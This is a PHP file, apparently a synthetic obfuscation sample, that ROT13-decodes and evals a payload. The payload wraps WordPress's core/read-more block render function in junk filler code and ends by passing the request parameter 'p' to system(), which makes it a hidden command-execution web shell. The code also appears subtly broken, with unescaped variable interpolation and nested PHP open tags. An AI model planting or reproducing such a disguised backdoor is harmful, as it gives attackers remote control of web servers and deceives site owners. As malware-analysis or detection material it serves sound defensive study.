<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/ernq-zber` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/ernq-zber` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 *
 * @cnenz neenl    $nggevohgrf Oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz JC_Oybpx $oybpx      Oybpx vafgnapr.
 * @erghea fgevat  Ergheaf gur cbfg yvax.
 */
shapgvba eraqre_oybpx_pber_ernq_zber( $nggevohgrf, $pbagrag, $oybpx ) {
	vs ( ! vffrg( $oybpx->pbagrkg['cbfgVq'] ) ) {
		erghea '';
	}

	$cbfg_VQ    = $oybpx->pbagrkg['cbfgVq'];
	$cbfg_gvgyr = trg_gur_gvgyr( $cbfg_VQ );
	vs ( '' === $cbfg_gvgyr ) {
		$cbfg_gvgyr = fcevags(
			/* genafyngbef: %f vf cbfg VQ gb qrfpevor gur yvax sbe fperra ernqref. */
			__( 'hagvgyrq cbfg %f' ),
			$cbfg_VQ
		);
	}
	$fperra_ernqre_grkg = fcevags(
		/* genafyngbef: %f vf rvgure gur cbfg gvgyr be cbfg VQ gb qrfpevor gur yvax sbe fperra ernqref. */
		__( ': %f' ),
		$cbfg_gvgyr
	);
	$whfgvsl_pynff_anzr = rzcgl( $nggevohgrf['whfgvslPbagrag'] ) ? '' : \"vf-whfgvsvrq-{$nggevohgrf['whfgvslPbagrag']}\";
	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => $whfgvsl_pynff_anzr ) );
	$zber_grkg          = ! rzcgl( $nggevohgrf['pbagrag'] ) ? jc_xfrf_cbfg( $nggevohgrf['pbagrag'] ) : __( 'Ernq zber' );
	erghea fcevags(
		'<n %1f uers=\"%2f\" gnetrg=\"%3f\">%4f<fcna pynff=\"fperra-ernqre-grkg\">%5f</fcna></n>',
		$jenccre_nggevohgrf,
		trg_gur_creznyvax( $cbfg_VQ ),
		rfp_ngge( $nggevohgrf['yvaxGnetrg'] ),
		$zber_grkg,
		$fperra_ernqre_grkg
	);
}

/**
 * Ertvfgref gur `pber/ernq-zber` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 */
shapgvba ertvfgre_oybpx_pber_ernq_zber() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/ernq-zber',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_ernq_zber',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_ernq_zber' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>